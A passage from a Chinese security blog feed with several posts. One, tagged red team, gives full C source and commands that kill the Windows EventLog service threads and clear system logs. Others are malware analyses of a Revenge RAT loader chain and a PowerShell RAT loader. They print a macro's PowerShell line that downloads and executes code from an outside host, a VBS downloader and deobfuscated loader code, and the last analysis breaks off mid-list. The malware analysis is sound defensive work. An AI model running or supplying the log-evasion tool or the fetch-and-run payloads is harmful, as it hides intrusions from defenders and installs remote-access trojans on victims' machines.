VirtualProtect函数里的地址跳转过去。dump即可</li><li>反射加载:运行进程后，Process Hacker找到该进程内存线程权限为RWX，dump即可得到完全解密的内容</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.163.com/dy/article/FOB083490531I6Y1.html" target="_blank" rel="noopener">https://www.163.com/dy/article/FOB083490531I6Y1.html</a><br><a href="https://blog.csdn.net/slc1112/article/details/111089013" target="_blank" rel="noopener">https://blog.csdn.net/slc1112/article/details/111089013</a></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>停止windows日志记录研究</title>
      <link href="/posts/c6ff3736.html"/>
      <url>/posts/c6ff3736.html</url>
      <content type="html"><![CDATA[<h2 id="方法一-注册表修改永久停止日志记录"><a href="#方法一-注册表修改永久停止日志记录" class="headerlink" title="方法一:注册表修改永久停止日志记录"></a>方法一:注册表修改永久停止日志记录</h2><p>需要注销/重启</p><pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MiniNt&quot;</code></pre><h2 id="方法二-停止记录日志记录的线程"><a href="#方法二-停止记录日志记录的线程" class="headerlink" title="方法二:停止记录日志记录的线程"></a>方法二:停止记录日志记录的线程</h2><p>思路:<br>tips:需要拥有SeDebugPrivilege权限，不然不能正确执行–&gt;使用powershell管理权限运行即可<br>1.遍历所有进程获取所有进程PID<br>2.获取所有进程名为svchost.exe的进程PID<br>3获取这些进程命令行存在LocalServiceNetworkRestricted字符串的PID<br>4.获取这个PID的所有线程(TID)，获取所有TID的服务名称。是eventlog/EventLog字符串服务名称杀掉线程</p><p>用到的API：<br>枚举所有进程:<br>CreateToolhelp32Snapshot<br>Process32First<br>Process32Next</p><p>x64获取指定进程块(PEB)/TEB信息:<br>ntdll.dll - NtQueryInformationProcess #获取进程块信息<br>ntdll.dll - NtQueryInformationThread #获取线程块信息</p><p>读取内存:<br>ReadProcessMemory</p><p>枚举所有线程:<br>CreateToolhelp32Snapshot<br>Thread32First<br>Thread32Next</p><blockquote><p>获取到进程号之后我们需要识别具体的服务线程，在windows vista之后的系统，具体的服务线程约定使用servicemain作为入口点，同时服务线程自身会带有一个等同于服务名的tag，这个tag可以帮我们识别这个线程是否是我们寻找的，在x64线程teb中0x1720偏移的位置存放着service tag的数字标识<br>我们可以那这个数字标识使用I_QueryTagInformation api查询到具体service tag内容。<br><img src="https://z3.ax1x.com/2021/05/18/gfZg2t.png" alt=""></p></blockquote><p><img src="https://z3.ax1x.com/2021/05/18/gfZs5d.png" alt=""></p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;winternl.h&gt;#pragma comment(lib, &quot;ntdll.lib&quot;)char *exename = &quot;svchost.exe&quot;;typedef struct _CLIENT_ID {    HANDLE UniqueProcess;    HANDLE UniqueThread;} CLIENT_ID;typedef NTSTATUS(WINAPI* pNtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);typedef struct _THREAD_BASIC_INFORMATION{    NTSTATUS    exitStatus;    PVOID       pTebBaseAddress;    CLIENT_ID   clientId;    KAFFINITY               AffinityMask;    int                        Priority;    int                        BasePriority;    int                        v;} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;typedef enum _SC_SERVICE_TAG_QUERY_TYPE{    ServiceNameFromTagInformation = 1,    ServiceNameReferencingModuleInformation,    ServiceNameTagMappingInformation,} SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;typedef struct _SC_SERVICE_TAG_QUERY{    ULONG   processId;    ULONG   serviceTag;    ULONG   reserved;    PVOID   pBuffer;} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;typedef NTSTATUS(WINAPI *NtQueryInformationProcessFake)(HANDLE, DWORD, PVOID, ULONG, PULONG);typedef ULONG(WINAPI* pI_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);#define errorlog(data) {printf(&quot;API Error:%s Code:%d\n&quot;,data,GetLastError());}void EnumProcess();void test(int);void checkeventlog(CHAR *, int);void EnumProcess() {    HANDLE hprocesseap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    if (INVALID_HANDLE_VALUE == hprocesseap) {        errorlog(&quot;Funcion EnumProcess---&gt;CreateToolhelp32Snapshot&quot;);    }    PROCESSENTRY32W pe;    pe.dwSize = sizeof(PROCESSENTRY32W);    BOOL getlist = Process32First(hprocesseap, &amp;pe);    while (getlist)    {        CHAR processname[100];        sprintf(processname, &quot;%ws&quot;, pe.szExeFile);        if (strcmp(exename, processname) == 0) {            test(pe.th32ProcessID);        }        getlist = Process32Next(hprocesseap, &amp;pe);    }}void test(int pid) {    HANDLE target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);    PEB peb = { 0 };    PROCESS_BASIC_INFORMATION pbi = { 0 };    NtQueryInformationProcessFake NtQueryInformationProcess;    RTL_USER_PROCESS_PARAMETERS Param = { 0 };    int commandlength = 0;    NtQueryInformationProcess = (NtQueryInformationProcessFake)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;);    NtQueryInformationProcess(target, 0, (PVOID)&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);    ReadProcessMemory(target, pbi.PebBaseAddress, &amp;peb, sizeof(PEB), NULL);    ReadProcessMemory(target, peb.ProcessParameters, &amp;Param, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);    WCHAR *buffer = new WCHAR[Param.CommandLine.Length + 1];    ZeroMemory(buffer, (Param.CommandLine.Length + 1) * sizeof(WCHAR));    ReadProcessMemory(target, Param.CommandLine.Buffer, buffer, Param.CommandLine.Length, NULL); //获取进程命令行    if (wcsstr(buffer, L&quot;LocalServiceNetworkRestricted&quot;)!=NULL) {        printf(&quot;PID:%d\n&quot;, pid);        checkeventlog(exename, pid);    }}void checkeventlog(CHAR *name, int pid) {    printf(&quot;%s %d\n&quot;, name, pid);    pNtQueryInformationThread NtQueryInformationThread = NULL;    pI_QueryTagInformation I_QueryTagInformation = NULL;    THREADENTRY32 te;    THREAD_BASIC_INFORMATION tbi = { 0 };    SC_SERVICE_TAG_QUERY tagQuery = { 0 };    te.dwSize = sizeof(THREADENTRY32);    HANDLE hTag = NULL;    NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationThread&quot;);    I_QueryTagInformation = (pI_QueryTagInformation)GetProcAddress(LoadLibrary(L&quot;advapi32.dll&quot;), &quot;I_QueryTagInformation&quot;);    HANDLE threads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);    if (INVALID_HANDLE_VALUE == threads) {        errorlog(&quot;checkeventlog---&gt;CreateToolhelp32Snapshot&quot;);    }    BOOL getlist = Thread32First(threads, &amp;te);    while (getlist) {        if (te.th32OwnerProcessID == pid) {            HANDLE hthread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);            NtQueryInformationThread(hthread, (THREAD_INFORMATION_CLASS)0, &amp;tbi, 0x30, NULL);            HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, te.th32OwnerProcessID);            ReadProcessMemory(hprocess, ((PBYTE)tbi.pTebBaseAddress + 0x1720), &amp;hTag, sizeof(HANDLE), NULL);            tagQuery.processId = te.th32OwnerProcessID;            tagQuery.serviceTag = (ULONG)hTag;            I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &amp;tagQuery); //获取线程的服务名称            CHAR servicename[MAX_PATH] = { 0 };            sprintf(servicename, &quot;%ws&quot;, tagQuery.pBuffer);            if (strcmp(servicename, &quot;EventLog&quot;)==0) {                printf(&quot;Kill %d %s\n&quot;, te.th32ThreadID, servicename);                TerminateThread(hthread, 0);            }            else if (strcmp(servicename, &quot;eventlog&quot;)==0) {                printf(&quot;Kill %d %s\n&quot;, te.th32ThreadID, servicename);                TerminateThread(hthread, 0);            }            tagQuery = { 0 }; //重置线程数组，不然只有一个线程的信息一直刷一样的 -作为一个例子记得写入笔记 (        }        getlist = Thread32Next(threads, &amp;te);    }}int main(){    EnumProcess();    system(&quot;pause&quot;);    return 0;}</code></pre><p>Windows7测试:<br><img src="https://z3.ax1x.com/2021/05/18/gfZYCR.png" alt=""></p><p>Windows10测试:<br><img src="https://z3.ax1x.com/2021/05/18/gfZWKf.png" alt=""></p><p>清除windows日志<br>(清除所有日志，但是将生成一个事件ID为1102的日志，用于清除日志)</p><pre><code>wevtutil cl Systemwevtutil cl Applicationwevtutil cl Securitywevtutil cl Setup</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/defense-evasion/fuck-eventlog" target="_blank" rel="noopener">https://idiotc4t.com/defense-evasion/fuck-eventlog</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Revenge RAT加载器分析(word远程模板加载)</title>
      <link href="/posts/ac1cf40.html"/>
      <url>/posts/ac1cf40.html</url>
      <content type="html"><![CDATA[<p>参考链接：<a href="https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america" target="_blank" rel="noopener">https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america</a><br>VT查杀<br><img src="https://z3.ax1x.com/2021/05/15/g6Qjoj.png" alt=""></p><h2 id="初始文件"><a href="#初始文件" class="headerlink" title="初始文件"></a>初始文件</h2><p><img src="https://z3.ax1x.com/2021/05/15/g6Q7SP.png" alt=""></p><p>方式:office vba远程模板加载<br><img src="https://z3.ax1x.com/2021/05/15/g6QzYn.png" alt=""></p><p>随机加载<a href="http://azulviagens.online/1-9.docx将下载并执行其中一个模板。" target="_blank" rel="noopener">http://azulviagens.online/1-9.docx将下载并执行其中一个模板。</a><br>每个文件都具有相同的内容（相同的SHA-256：338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9）<br><img src="https://z3.ax1x.com/2021/05/15/g6lClV.png" alt=""></p><h2 id="模板文件"><a href="#模板文件" class="headerlink" title="模板文件"></a>模板文件</h2><blockquote><p>模板文件（“ 1.docx” …“ 9x.docx”）遵循图4（如下所示）所示的结构。结构中的settings.xml具有指向XLSM文件的“目标”字段，该字段位于DOCX文件结构的“嵌入”目录中。XLSM文件“ Microsoft_Excel_Macro-Enabled_Worksheet.xlsm”到“ Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm”具有相同的内容（相同的SHA-256：32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2）。当Microsoft Word执行模板文件（“ 1.docx” …“ 9x.docx”）时，它将执行XLSM文件之一（“ Microsoft_Excel_Macro-Enabled_Worksheet.xlsm”到“ Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm”）<br><img src="https://z3.ax1x.com/2021/05/15/g6ltfI.png" alt=""></p></blockquote><p>docx模板中的XLSM文件<br><img src="https://z3.ax1x.com/2021/05/15/g6la1P.png" alt=""></p><p>word/embeddings目录下任意一个xlsm文件<br><img src="https://z3.ax1x.com/2021/05/15/g6lykj.png" alt=""></p><h2 id="xlsm文件"><a href="#xlsm文件" class="headerlink" title="xlsm文件"></a>xlsm文件</h2><p>该结构在“ VBAProject.bin”文件中包含宏。以下屏幕快照显示了包含宏的流。olevba提取宏</p><pre><code>Dim Program As String, TaskID As DoubleProgram = UserForm1.Image1.ControlTipText + UserForm1.Frame1.Tag + UserForm1.TabStrip1.ControlTipText + UserForm1.ScrollBar1.TagProgram01 = UserForm2.Image1.Tag + UserForm2.Frame1.ControlTipTextOn Error Resume Next        AppActivate &quot;UserForm1&quot;If Err &lt;&gt; 0 Then                Err = 0TaskID = Shell(Program, 0) //PowerShell  -ex Bypass -nOp -w 1 iex(iwr(&#39;http://azulviagens.online/A.txt&#39;))TaskID01 = Shell(Program01, 0) //taskkill  /f /im WINWORD.EXE            If Err &lt;&gt; 0 Then MsgBox &quot;Can&#39;t start &quot; &amp; ProgramEnd IfEnd Sub</code></pre><p><img src="https://z3.ax1x.com/2021/05/15/g6lXjK.png" alt=""></p><p>UserForm1.Image1.ControlTipText olevba没看到，由于是shell函数执行的程序。火绒剑监控得到运行的内容<br><img src="https://z3.ax1x.com/2021/05/15/g6lvnO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/15/g6lzHe.png" alt=""><br>(调用powershell远程下载执行)</p><p><img src="https://z3.ax1x.com/2021/05/15/g61C4A.png" alt=""><br>(杀掉进程WINWORD.exe)</p><p><code>http://azulviagens.online/A.txt</code>在复现的时候已经失效了，根据原文章的图如下</p><pre><code class="vbs">$ProcName=&quot;index.vbs&quot;$WebFile=&quot;http://azulviagens.online/index.mp3&quot;C&#39;l&#39;e&#39;a&#39;r&#39;-&#39;H&#39;o&#39;s&#39;t&#39;(N&#39;e&#39;W-&#39;O&#39;b&#39;j&#39;e&#39;c&#39;t&#39; S&#39;y&#39;s&#39;t&#39;e&#39;m&#39;.&#39;N&#39;e&#39;t&#39;.&#39;W&#39;e&#39;b&#39;C&#39;l&#39;ient).DownloadFile($WebFile,&quot;$env:APPDATA\$ProcName&quot;) #保存在C:\Users\&lt;Username&gt;\AppData\Roaming\index.vbsS&#39;t&#39;a&#39;r&#39;t&#39;-&#39;P&#39;r&#39;o&#39;c&#39;e&#39;s&#39;s (&quot;$env:APPDATA\$ProcName&quot;) #运行C:\Users\&lt;Username&gt;\AppData\Roaming\index.vbs</code></pre><p>最后运行index.vbs然后index.vbs远程下载/1.txt保存在Opera.vbs然后运行Opera.vbs<br><img src="https://z3.ax1x.com/2021/05/15/g61a59.png" alt=""></p><p>最后是远程下载Opera.ps1并执行，ps1内容如下<br>重度混淆（<br><img src="https://z3.ax1x.com/2021/05/15/g61081.png" alt=""></p><p>经过手动解密混淆，过程如下</p><pre><code># Decode 1$a=iex  (  [CHar]36+[CHar]101  +[CHar]107+[CHar]108+[CHar]116+  [CHar]107+[CHar]116+  [CHar]101  +[CHar]107  +[CHar]100  +  [CHar]107+[CHar]113+  [CHar]106  +  [CHar]102+[CHar]100+[CHar]107  +[CHar]102  +  [CHar]100+[CHar]107+[CHar]102  +[CHar]107  +  [CHar]100  +[CHar]102+[CHar]107  +[CHar]115+  [CHar]100  +[CHar]107+  [CHar]115  +  [CHar]100  +[CHar]107+  [CHar]118  +  [CHar]99  +[CHar]107  +[CHar]107+  [CHar]101  +  [CHar]114  +[CHar]107+[CHar]101  +  [CHar]119  +  [CHar]116  +  [CHar]101  +  [CHar]107+  [CHar]114  +  [CHar]116+  [CHar]101+[CHar]107  +[CHar]121  +  [CHar]101  +  [CHar]107  +  [CHar]119  +[CHar]48  +[CHar]48  +  [CHar]48+  [CHar]48+  [CHar]61+[CHar]45+[CHar]74  +[CHar]111+  [CHar]105+  [CHar]110  +  [CHar]32+  [CHar]40  +[CHar]40+[CHar]49+  [CHar]49  +[CHar]49+[CHar]44  +  [CHar]32  +[CHar]49+[CHar]48+[CHar]53+  [CHar]44+[CHar]32+[CHar]49  +[CHar]51+  [CHar]48+  [CHar]41+  [CHar]124+  [CHar]32  +[CHar]70+[CHar]111+[CHar]114  +[CHar]69+  [CHar]97  +  [CHar]99  +  [CHar]104  +[CHar]45+[CHar]79+  [CHar]98+  [CHar]106+[CHar]101+[CHar]99  +  [CHar]116  +[CHar]32  +[CHar]123  +[CHar]40+[CHar]32+[CHar]91  +  [CHar]67  +[CHar]111+  [CHar]110+[CHar]118+  [CHar]101+[CHar]114+  [CHar]116  +[CHar]93+[CHar]58  +[CHar]58+  [CHar]84  +  [CHar]111+  [CHar]73  +  [CHar]110+  [CHar]116+[CHar]49+  [CHar]54  +[CHar]40  +[CHar]40+[CHar]91  +  [CHar]83+[CHar]116+  [CHar]114  +  [CHar]105+  [CHar]110  +  [CHar]103+[CHar]93+  [CHar]36+  [CHar]95+[CHar]32  +  [CHar]41+  [CHar]44  +  [CHar]32  +  [CHar]56+  [CHar]41+[CHar]32+[CHar]45+[CHar]65  +  [CHar]115+  [CHar]91+[CHar]67  +[CHar]104  +  [CHar]97  +[CHar]114+[CHar]93+[CHar]41+  [CHar]125  +[CHar]41  +[CHar]59  +[CHar]115+[CHar]97  +  [CHar]108+[CHar]32+  [CHar]103  +  [CHar]32+  [CHar]36  +[CHar]101  +  [CHar]107  +[CHar]108+  [CHar]116+  [CHar]107+[CHar]116+[CHar]101  +  [CHar]107  +[CHar]100  +[CHar]107  +  [CHar]113  +[CHar]106+  [CHar]102  +  [CHar]100+[CHar]107  +[CHar]102  +[CHar]100+[CHar]107+[CHar]102+[CHar]107  +[CHar]100  +  [CHar]102  +[CHar]107+  [CHar]115  +  [CHar]100+  [CHar]107  +[CHar]115+  [CHar]100+  [CHar]107  +  [CHar]118  +  [CHar]99  +[CHar]107  +  [CHar]107  +[CHar]101  +  [CHar]114  +  [CHar]107+  [CHar]101+  [CHar]119+  [CHar]116+[CHar]101+  [CHar]107  +  [CHar]114  +  [CHar]116+  [CHar]101  +[CHar]107  +[CHar]121  +[CHar]101  +  [CHar]107  +  [CHar]119+[CHar]48  +[CHar]48+  [CHar]48+[CHar]48  )# Decode 2$ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000=-Join ((111, 105, 130)| ForEach-Object {( [Convert]::ToInt16(([String]$_ ), 8) -As[Char])});sal g $ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000 #sal为set-alias变量缩写# Decode 3iex(  [CHar]70+  [CHar]117  +  [CHar]110  +  [CHar]99+  [CHar]116+  [CHar]105  +  [CHar]111+  [CHar]110  +  [CHar]32  +  [CHar]109+  [CHar]97+  [CHar]120+[CHar]100  +[CHar]111+[CHar]111  +[CHar]111  +[CHar]109  +[CHar]32+  [CHar]123+[CHar]13  +[CHar]10+[CHar]32+  [CHar]13+  [CHar]10  +[CHar]32  +[CHar]32+  [CHar]32+[CHar]32  +  [CHar]91  +  [CHar]67+  [CHar]109  +[CHar]100+[CHar]108+  [CHar]101  +  [CHar]116+[CHar]66+[CHar]105+  [CHar]110  +[CHar]100  +[CHar]105+  [CHar]110  +  [CHar]103  +  [CHar]40  +[CHar]41  +  [CHar]93+  [CHar]13  +  [CHar]10  +[CHar]32+  [CHar]32  +  [CHar]32  +  [CHar]32  +[CHar]91  +[CHar]79  +[CHar]117  +[CHar]116+  [CHar]112  +[CHar]117  +[CHar]116  +  [CHar]84+  [CHar]121+  [CHar]112+[CHar]101+  [CHar]40+  [CHar]91  +[CHar]98+  [CHar]121  +  [CHar]116+[CHar]101+[CHar]91  +  [CHar]93+[CHar]93  +[CHar]41+  [CHar]93  +[CHar]13  +  [CHar]10+  [CHar]32+  [CHar]32+  [CHar]32  +  [CHar]32  +[CHar]112+[CHar]97  +[CHar]114  +[CHar]97  +[CHar]109  +[CHar]40  +  [CHar]13  +  [CHar]10  +  [CHar]32+  [CHar]32+  [CHar]32+  [CHar]32+[CHar]32  +[CHar]32+[CHar]32  +[CHar]32  +  [CHar]91  +  [CHar]80+[CHar]97+  [CHar]114  +  [CHar]97  +[CHar]109+[CHar]101+  [CHar]116  +[CHar]101  +  [CHar]114+  [CHar]40+[CHar]77+  [CHar]97  +[CHar]110  +[CHar]100+  [CHar]97+[CHar]116  +[CHar]111  +  [CHar]114  +[CHar]121  +[CHar]61+[CHar]36+  [CHar]116+  [CHar]114+[CHar]117+[CHar]101  +  [CHar]41+[CHar]93  +[CHar]32  +  [CHar]91+  [CHar]83  +  [CHar]116  +[CHar]114+[CHar]105  +[CHar]110+[CHar]103  +  [CHar]93+  [CHar]36+[CHar]122+  [CHar]88+[CHar]97+[CHar]87  +  [CHar]86  +  [CHar]80+[CHar]105+  [CHar]13  +[CHar]10  +  [CHar]32  +  [CHar]32  +  [CHar]32+  [CHar]32+  [CHar]41+[CHar]13  +[CHar]10  +[CHar]32+[CHar]32  +  [CHar]32+[CHar]32  +[CHar]36+[CHar]72+[CHar]116  +[CHar]116+[CHar]108  +[CHar]100+  [CHar]120  +[CHar]120  +  [CHar]49+  [CHar]115+  [CHar]49+  [CHar]115  +[CHar]51  +  [CHar]100+  [CHar]52  +  [CHar]102  +  [CHar]53+[CHar]118+  [CHar]53  +  [CHar]32  +  [CHar]61+[CHar]32  +  [CHar]78  +  [CHar]101  +[CHar]119  +[CHar]45+  [CHar]79  +  [CHar]98  +  [CHar]106  +[CHar]101  +  [CHar]99  +[CHar]116+  [CHar]32+[CHar]45+[CHar]84+  [CHar]121  +[CHar]112  +  [CHar]101  +  [CHar]78  +  [CHar]97+[CHar]109+  [CHar]101+  [CHar]32  +[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]91+[CHar]93  +  [CHar]32  +[CHar]45  +  [CHar]65  +[CHar]114+  [CHar]103+[CHar]117+  [CHar]109  +  [CHar]101+[CHar]110  +  [CHar]116+[CHar]76  +[CHar]105+[CHar]115+[CHar]116  +[CHar]32+[CHar]40  +  [CHar]36  +[CHar]122  +[CHar]88+  [CHar]97  +  [CHar]87+[CHar]86+  [CHar]80+  [CHar]105+  [CHar]46  +[CHar]76  +  [CHar]101+[CHar]110+  [CHar]103  +[CHar]116+  [CHar]104  +  [CHar]32  +[CHar]47  +  [CHar]32+  [CHar]50+  [CHar]41  +  [CHar]13  +  [CHar]10+  [CHar]32  +[CHar]32+[CHar]32  +[CHar]32+  [CHar]102+  [CHar]111  +  [CHar]114  +[CHar]32+  [CHar]40+[CHar]36  +[CHar]105  +[CHar]32  +  [CHar]61  +[CHar]32  +  [CHar]48  +  [CHar]59  +[CHar]32+  [CHar]36  +  [CHar]105  +[CHar]32+  [CHar]45+[CHar]108+[CHar]116  +[CHar]32  +  [CHar]36+[CHar]122+  [CHar]88  +  [CHar]97  +  [CHar]87+  [CHar]86+  [CHar]80  +  [CHar]105+  [CHar]46  +[CHar]76  +  [CHar]101  +[CHar]110  +[CHar]103  +[CHar]116  +[CHar]104+[CHar]59+  [CHar]32+  [CHar]36+  [CHar]105+  [CHar]32+[CHar]43  +[CHar]61+[CHar]32  +[CHar]50  +  [CHar]41  +[CHar]32+[CHar]123+  [CHar]13  +[CHar]10+  [CHar]32  +  [CHar]32+[CHar]32+[CHar]32  +[CHar]32  +[CHar]32  +  [CHar]32  +  [CHar]32  +[CHar]36  +  [CHar]72+[CHar]116+[CHar]116  +[CHar]108+  [CHar]100+  [CHar]120+  [CHar]120  +[CHar]49+  [CHar]115+  [CHar]49  +[CHar]115+  [CHar]51  +  [CHar]100+  [CHar]52+[CHar]102  +[CHar]53+  [CHar]118+[CHar]53  +  [CHar]91+[CHar]36  +  [CHar]105+  [CHar]32+  [CHar]47  +[CHar]32+[CHar]50  +[CHar]93  +[CHar]32+  [CHar]61+[CHar]32+[CHar]91  +[CHar]67+  [CHar]111+  [CHar]110  +[CHar]118  +  [CHar]101+[CHar]114+[CHar]116+[CHar]93  +  [CHar]58+[CHar]58  +  [CHar]84  +  [CHar]111  +[CHar]66+[CHar]121  +[CHar]116+[CHar]101+[CHar]40+  [CHar]36  +  [CHar]122  +  [CHar]88  +[CHar]97  +[CHar]87+  [CHar]86  +  [CHar]80+[CHar]105+[CHar]46  +  [CHar]83+  [CHar]117  +  [CHar]98  +[CHar]115  +[CHar]116  +  [CHar]114+  [CHar]105  +[CHar]110  +[CHar]103  +  [CHar]40+  [CHar]36  +  [CHar]105  +[CHar]44+  [CHar]32  +[CHar]50+  [CHar]41+[CHar]44  +[CHar]32  +  [CHar]49  +[CHar]54  +[CHar]41+  [CHar]13  +[CHar]10  +[CHar]32  +  [CHar]32+[CHar]32+[CHar]32  +  [CHar]125  +[CHar]13+  [CHar]10  +  [CHar]13+  [CHar]10+  [CHar]32  +  [CHar]32+[CHar]32  +[CHar]32  +[CHar]114  +  [CHar]101  +[CHar]116+  [CHar]117+[CHar]114+  [CHar]110+[CHar]32+  [CHar]91+  [CHar]98+  [CHar]121  +[CHar]116+  [CHar]101+[CHar]91  +[CHar]93+  [CHar]93  +  [CHar]36+[CHar]72+[CHar]116  +  [CHar]116+  [CHar]108+[CHar]100+[CHar]120  +[CHar]120+[CHar]49+  [CHar]115+  [CHar]49  +[CHar]115+[CHar]51+  [CHar]100+  [CHar]52+  [CHar]102+  [CHar]53+  [CHar]118+  [CHar]53+[CHar]13  +[CHar]10  +  [CHar]125  )# Decode 4Function maxdooom {    [CmdletBinding()]    [OutputType([byte[]])]    param(        [Parameter(Mandatory=$true)] [String]$zXaWVPi    )    $Httldxx1s1s3d4f5v5 = New-Object -TypeName byte[] -ArgumentList ($zXaWVPi.Length / 2)    for ($i = 0; $i -lt $zXaWVPi.Length; $i += 2) {        $Httldxx1s1s3d4f5v5[$i / 2] = [Convert]::ToByte($zXaWVPi.Substring($i, 2), 16)    }    return [byte[]]$Httldxx1s1s3d4f5v5}${\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`}  -&gt; IEX${!!!} -&gt; IEX&amp;( ([sTRIng]$vERbOsepreFERENcE)[1,3]+&#39;x&#39;-jOIN&#39;&#39;) -&gt; IEX</code></pre><p>第一行的混淆最终结果是这样的<br><img src="https://z3.ax1x.com/2021/05/15/g61h8I.png" alt=""></p><p>第四行混淆<br><img src="https://z3.ax1x.com/2021/05/15/g61qaQ.png" alt=""></p><p>第七行混淆<br><img src="https://z3.ax1x.com/2021/05/15/g61jGn.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63prT.png" alt=""></p><p>最终解密得到后的ps1</p><pre><code>sal g $ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000[String]$CXCXxcxsderrewrttyrghbvvbc=&quot;&lt;BIN_HEX&gt;&quot;Function maxdooom {    [CmdletBinding()]    [OutputType([byte[]])]    param(        [Parameter(Mandatory=$true)] [String]$zXaWVPi    )    $Httldxx1s1s3d4f5v5 = New-Object -TypeName byte[] -ArgumentList ($zXaWVPi.Length / 2)    for ($i = 0; $i -lt $zXaWVPi.Length; $i += 2) {        $Httldxx1s1s3d4f5v5[$i / 2] = [Convert]::ToByte($zXaWVPi.Substring($i, 2), 16)    }    return [byte[]]$Httldxx1s1s3d4f5v5}[String]$Cmder2021=&quot;&lt;BIN_HEX&gt;&quot;</code></pre><h2 id="NET文件"><a href="#NET文件" class="headerlink" title=".NET文件"></a>.NET文件</h2><p>$CXCXxcxsderrewrttyrghbvvbc变量存的PE是Revenge RAT，上次就分析过这里了略过，分析链接：<a href="https://422926799.github.io/posts/43591be7.html" target="_blank" rel="noopener">https://422926799.github.io/posts/43591be7.html</a><br><img src="https://z3.ax1x.com/2021/05/15/g63Zxx.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63mM6.png" alt=""></p><p>$Cmder2021变量里的存的PE则是读取资源文件内存加载<br><img src="https://z3.ax1x.com/2021/05/15/g63nsK.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63uqO.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63MZD.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63GRI.png" alt=""></p><p>资源文件<br><img src="https://z3.ax1x.com/2021/05/15/g63Jzt.png" alt=""></p><h2 id="URLS"><a href="#URLS" class="headerlink" title="URLS"></a>URLS</h2><p><a href="http://azulviagens.online" target="_blank" rel="noopener">http://azulviagens.online</a><br>Cdtpitbull.hopto.org</p><h2 id="HASHES"><a href="#HASHES" class="headerlink" title="HASHES"></a>HASHES</h2><p>Initial attack document<br>91611ac2268d9bf7b7cb2e71976c630f6b4bfdbb68774420bf01fd1493ed28c7</p><p>Initial attack document<br>77d6651de47bff4c24fc26fa018ea648b0e14e276e8240fae6b1724b8638c46a</p><p>1.docx(template)<br>338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9</p><p>Microsoft_Excel_Macro-Enabled_Worksheet.xlsm<br>32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2</p><p>A.txt<br>4b65e5785692950f8100b22f2827d65ba93e99dd717eb444af035e96fcd84763</p><p>opera.ps1<br>03f5ff9b6a6b24f76799cc15fe3f1fbf1ca9d6dda30a4154125ed5dd5834290c</p><p>Revenge RAT<br>73f113a6146224c4a1f92f89055922a28322787c108e30000a0a420fa46ed9e2</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ps1加载Trojan RAT dll分析</title>
      <link href="/posts/43591be7.html"/>
      <url>/posts/43591be7.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看到个ps1的链接，没事干下载下来分析了一下<br>感觉挺有意思，ps1链接:<a href="https://pastebin.com/raw/7Ze9v4qa" target="_blank" rel="noopener">https://pastebin.com/raw/7Ze9v4qa</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>原ps1内容，一眼看去关键的地方经过了混淆<br><img src="https://z3.ax1x.com/2021/05/09/gJOqZd.png" alt=""></p><p>手动解密，最终得到的内容如下<br><img src="https://z3.ax1x.com/2021/05/09/gJXCLQ.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/09/gJX0wd.png" alt=""></p><p>$RUNPE变量是加密的csahrp源码<br>$Bytes是加密的RAT DLL</p><p>该ps1的功能如下:<br>       0.延时1秒</p><pre><code>1. StartupCheck环境变量存在的话写入vbs调用INSTALL函数    * %Startup%环境变量不存在调用CodeDom函数1. CodeDom函数功能    1. 